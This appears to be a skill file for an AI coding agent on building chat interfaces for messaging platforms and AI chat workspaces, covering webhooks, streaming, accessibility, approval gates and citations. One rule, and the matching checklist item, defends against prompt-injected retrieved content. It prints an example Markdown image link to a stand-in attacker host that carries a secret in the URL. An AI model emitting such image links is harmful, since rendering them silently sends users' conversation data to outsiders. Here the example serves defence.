---
name: pixelcraft-chat-ui
description: Designs and verifies conversational interfaces across two tracks—(A) host-constrained messaging platforms and mini apps (Slack Block Kit/AI Assistants, Discord Components V2/Activities, Telegram Bots/Mini Apps, Zalo Mini Apps/ZNS, WhatsApp Interactive Messages/Flows, Microsoft Teams Adaptive Cards/AI Library, LINE LIFF/Flex Messages, WeChat Mini Program) and (B) app-owned AI and agentic chat workspaces (Vercel AI SDK UI, assistant-ui, CopilotKit v2, AG-UI, MCP Apps/MCP-UI, OpenAI Apps SDK, Google A2UI, LangGraph useStream, streaming traces, branching, split artifacts, and approval gates).
license: MIT
metadata:
  version: 0.1.0
---

# Pixelcraft chat UI

Conversational interfaces fall into two distinct architectural tracks. Identify which track you are building first so you neither force web-app chrome into a host-constrained messaging payload nor under-design an app-owned AI workbench:

- **Track A — Host-constrained Messaging & Mini Apps**: Slack, Discord, Telegram, Zalo, WhatsApp, Microsoft Teams, LINE, and WeChat. The host controls typography, spacing, theme, accessibility tree, notifications, and hard payload/timeout limits. Reduce every turn to the smallest actionable native primitive and preserve plain-text fallback.
- **Track B — App-owned AI & Agentic Chat Workspaces**: Custom web, desktop, or mobile AI assistants, copilots, and multi-agent workbenches. You own scroll physics, streaming Markdown stability, collapsible tool/reasoning traces, conversation branching, split artifact panes, citations, and human-in-the-loop approval gates.

## Surface craft

Let the message carry the essential meaning as scannable text, then offer the next relevant native action. For Track A, verify interaction acknowledgements (3 s windows), expired or duplicate taps, byte/character budgets, and plain-text fallback on degraded clients. For Track B, verify scroll-yield when the user scrolls up mid-stream, `Stop` abort integrity, collapsed traces, and idempotent approval cards. Never mistake fake typing theater, decorative blocks, or emoji bullet spam for usable interaction.

## References

- Read [references/slack-discord.md](references/slack-discord.md) when building Slack Block Kit (including AI Assistant streaming surfaces, `table`/`rich_text` blocks) or Discord embeds, Components V2, expanded Modals, and Embedded Activities.
- Read [references/mobile-business-platforms.md](references/mobile-business-platforms.md) when building Telegram Bots/Mini Apps (Bot API 8.x–9.x), Zalo Mini Apps/ZNS, WhatsApp Interactive Messages & Flows, Microsoft Teams Adaptive Cards/AI Library, LINE LIFF/Flex Messages, or WeChat Mini Programs.
- Read [references/conversation-design.md](references/conversation-design.md) when designing progressive disclosure, ephemeral vs persistent state, idempotent interaction lifecycles, plain-text fallbacks, and privacy/anti-slop rules across any chat surface.
- Read [references/agentic-workspace.md](references/agentic-workspace.md) when designing app-owned AI workspaces: streaming scroll-yield, tool/reasoning traces, approval gates, split artifact panes, branching/edit-and-fork, multimodal/voice/`@`-mentions, resumable runs, context transparency, and streaming Markdown/XSS safety.
- Read [references/ai-ui-libraries.md](references/ai-ui-libraries.md) when implementing AI frontend SDKs and protocols: Vercel AI SDK v5/v6 (React, Vue, Svelte, Angular), `assistant-ui`, CopilotKit v2, AG-UI, MCP Apps/MCP-UI, OpenAI Apps SDK (`window.openai`), Google A2UI, AI Elements/prompt-kit, or LangGraph `useStream`.

## Required workflow

1. **Select track and surface.** Track A (channel, DM, ephemeral reply, thread, modal, Home tab, mini app, Flow, Adaptive Card) or Track B (standalone workspace, side-panel copilot, embedded MCP/Apps widget). Capabilities, timeouts, and privacy rules differ sharply.
2. **Define the conversational job.** Separate immediate answer, supporting evidence/trace, primary action, confirmation/approval gate, and persistent audit state.
3. **Choose native primitives or typed SDK parts.** On Track A, use host-native buttons/selects/cards/Flows instead of ASCII tables or screenshots. On Track B, render structured typed parts (`text`, `reasoning`, `tool-*`, `source-*`) rather than overloading flat strings.
4. **Budget limits and latency.** Count exact UTF-8 bytes/characters, component caps, and ack timeouts (Track A) or streaming render/context-window/resume lifecycles (Track B).
5. **Preserve fallback and recovery.** Guarantee plain-text fallback, idempotent server-side authorization, preserved failed drafts, and clear stopped/expired/unauthorized states.
6. **Verify on real targets.** Inspect desktop/mobile, light/dark, narrow viewports (`390px`), keyboard/screen-reader narration, localization expansion, offline/retry, and abort/expiry paths. Label gaps honestly as `not-checked`.

## Non-negotiable rules

| Concern | Rule |
|---|---|
| platform truth & Track A bot lifecycle | Across **`Slack`, `Discord`, `Telegram`, `Zalo`, `WhatsApp`, `Teams`, `LINE`, and `WeChat`**, return a **fast webhook `ack` within the host timeout (`< 2–3 s`)** + async deferred progress state, enforce **idempotent `event_id` / `interaction_id` deduplication** against webhook retries, handle **edited and deleted user/bot messages** cleanly (canceling stale runs or updating linked replies), and return **actionable invalid-command / missing-parameter usage guidance** with an example or interactive picker. |
| stream ergonomics, AST budget & `aria-live` throttling | Keep auto-scroll sticky **only within `~48–80 px` of bottom** with a floating `"Jump to bottom"` pill, **throttle Markdown AST re-parses (`~30–50 ms` / `rAF`)**, **keep the composer input editable while streaming** (toggle `Send` <-> `Stop` `AbortController`, never `disabled={isBusy}`), and **throttle polite `aria-live="polite"` status announcements** (announcing `"Generating response…"` / paragraph milestones / `"Response complete"`—never spamming screen readers on every streamed token or using `aria-live="assertive"`). |
| XSS & Markdown image exfiltration defense | Sanitize HTML/links **AND enforce strict `CSP img-src` allowlisting, signed image proxy, or click-to-load** on untrusted Markdown images (`![leak](https://attacker.tld/steal?secret=...)`) so prompt-injected RAG content cannot silently exfiltrate conversation data on render! |
| human-in-the-loop (`HITL`) & action safety | Gate destructive, financial, or external tool calls behind an idempotent inline approval card rendering a **human-readable `Before -> After` diff + exact target & parameters** with `Approve once` / `Edit` / `Reject`—never blind raw JSON. |
| grounded citations | Inline citations must click-to-scroll and highlight exact retrieved source passages; refuse to fabricate URLs or ungrounded confidence badges. |
| recovery, `429` & warm escalation | Render **3-part recovery errors (*What failed / Why / Next action*)**, **`429` rate-limit countdown / automatic queue**, **context-window compaction indicators**, and **warm human-support escalation** (forwarding a structured transcript summary so the user never repeats themselves). |
| privacy & retention | Validate webhooks/`initData`/tokens server-side, surface explicit **data retention / model-training disclosure + one-click Thread Delete**, and name controls by outcome. |

## Pre-submit checklist

- [ ] **Track A messaging bots (`Slack`, `Discord`, `Telegram`, `Zalo`, `WhatsApp`, `Teams`, `LINE`, `WeChat`)**: **`< 2–3 s` webhook `ack`** + async progress state, **idempotent event deduplication**, **edited/deleted message handling**, **invalid-command / missing-parameter guidance**, and plain-text fallback verified;
- [ ] **Track B streaming & screen-reader ergonomics**: composer stays **editable during streaming** (`Send` <-> `Stop` `AbortController`), scroll yields outside `48–80 px` of bottom (`"Jump to bottom"`), Markdown AST throttles at `~30–50 ms` / `rAF`, and **polite `aria-live` announcements are throttled** so screen readers are never spammed token-by-token;
- [ ] HTML XSS **and** Markdown `![](https://...)` **data-exfiltration defense** (`CSP img-src` allowlist / proxy / click-to-load) enforced;
- [ ] `HITL` tool cards show human-readable **`Before -> After` diffs** (`Approve once` / `Edit` / `Reject`) idempotently, and inline citations scroll/highlight verified source passages;
- [ ] **3-part errors**, **`429` countdown/queue**, **context compaction banner**, **warm human handoff with summary**, and **data-retention / Thread Delete** controls wired;
- [ ] light/dark, `390 px` mobile, and keyboard/screen-reader walkthroughs verified (`rendered` vs `static` vs `not-checked`);
- [ ] **Checklist-Until-Passing Stop-Gate (`<HARD-GATE>`):** walk every checklist item above + run `slop-scan.mjs --fail-on p2`, `check-contrast.mjs`, webhook/streaming tests, and `check-acceptance.mjs .pixelcraft/acceptance.json` (`pixelcraft-review`) in a `Fix → Re-verify` loop until passing (`0` `fail`/`pending` rows, `rendered` evidence on visual/perf/a11y per `Rule #0.3`).
